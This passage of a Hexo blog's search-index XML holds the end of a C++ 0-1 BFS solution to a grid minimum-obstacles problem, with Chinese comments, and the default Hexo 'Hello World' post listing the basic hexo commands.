class="hljs-type">int</span> <span class="hljs-title">minimumObstacles</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;<br>        <span class="hljs-type">int</span> m = grid.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> n =grid[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>();<br>        vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;<span class="hljs-built_in">dist</span>(m,<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(n,inf));<br>        deque&lt;pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;&gt;dq;<br>        dq.<span class="hljs-built_in">push_front</span>(&#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;);<span class="hljs-comment">//起点放入队列</span><br>        dist[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] =<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span>(!dq.<span class="hljs-built_in">empty</span>())<br>        &#123;<br>            <span class="hljs-keyword">auto</span> [x,y] = dq.<span class="hljs-built_in">front</span>();<br>            dq.<span class="hljs-built_in">pop_front</span>();<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">4</span>;i++)<br>            &#123;<br>                <span class="hljs-type">int</span> nx= x+dx[i];<br>                <span class="hljs-type">int</span> ny = y+dy[i];<br>                <span class="hljs-keyword">if</span>(nx&gt;=<span class="hljs-number">0</span> &amp;&amp; nx&lt;m &amp;&amp;ny&gt;=<span class="hljs-number">0</span> &amp;&amp;ny&lt;n)<br>                &#123;<br>                    <span class="hljs-type">int</span> w = grid[nx][ny];<span class="hljs-comment">//获取权值</span><br>                    <span class="hljs-keyword">if</span>(dist[x][y]+w&lt;dist[nx][ny])<span class="hljs-comment">//若存在更短路径则更新权值。</span><br>                    &#123;<br>                        dist[nx][ny] = dist[x][y]+w;<br>                        <span class="hljs-keyword">if</span>(w==<span class="hljs-number">0</span>)dq.<span class="hljs-built_in">push_front</span>(&#123;nx,ny&#125;);<span class="hljs-comment">//若权值为0放入队首，否则放入队尾。</span><br>                        <span class="hljs-keyword">else</span> dq.<span class="hljs-built_in">push_back</span>(&#123;nx,ny&#125;);<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> dist[m<span class="hljs-number">-1</span>][n<span class="hljs-number">-1</span>];<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/12/30/hello-world/"/>
    <url>/2022/12/30/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
